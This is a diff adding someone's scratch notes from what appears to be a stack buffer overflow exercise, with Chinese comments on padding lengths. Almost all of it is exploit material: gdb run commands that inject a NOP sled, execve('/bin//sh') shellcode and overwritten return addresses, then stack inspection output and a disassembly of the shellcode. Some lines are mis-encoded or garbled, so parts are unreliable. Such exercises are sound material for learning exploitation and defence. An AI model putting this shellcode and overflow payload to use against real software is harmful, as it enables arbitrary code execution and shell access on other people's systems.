@@ -1,0 +1,58 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC
+
+// 上面这个是 112A + 8B + 4C 就刚好使得ebp = BBBBBBBB, eip = CCCC
+// B现在要占25？ 那么A需要95个
+
+r $(python -c 'print "\x90" * 71 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x74\xdf\xfe\xff\xff\x7f" * 5')
+
+r $(python -c 'print "\x90" * 71 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x6c\xdf\xfe\xff\xff\x7f" * 5')
+
+info registers
+x/100x $sp-100
+
+x/200xb $rsp-100
+
+
+0x7ffffffedf6c
+0x7ffffffedf10
+0x ff fe df b0
+\x10\xdf\xfe\xff\xff\x7f
+// 下面这个差不多正确
+1ÀPh//shh/binãPâSá°ÍBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCC
+
+
+7f ff ff fe df 5c
+\x5c\xdf\xfe\xff\xff\x7f
+
+
+// 这个刚好
+1ÀPh//shh/binãPâSá°ÍBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCC
+1ÀPh//shh/binãPâSá°ÍBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCC
+1ÀPh//shh/binãPâSá°ÍBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBL����
+
+7ffffffedf4c
+
+7ffffffedf5c
+7f ff ff fe df 5c
+
+\x5c\xdf\xfe\xff\xff\x7f
+
+info registers
+
+x/100x $sp-100
+
+
+   0:   31 c0                   xor    eax,eax
+   2:   50                      push   eax
+   3:   68 2f 2f 73 68          push   0x68732f2f
+   8:   68 2f 62 69 6e          push   0x6e69622f
+   d:   89 e3                   mov    ebx,esp
+   f:   50                      push   eax
+  10:   89 e2                   mov    edx,esp
+  12:   53                      push   ebx
+  13:   89 e1                   mov    ecx,esp
+  15:   b0 0b                   mov    al,0xb
+  17:   cd 80   
+
+
+ perl -e 'printf "A"' > bad.txt ;./test
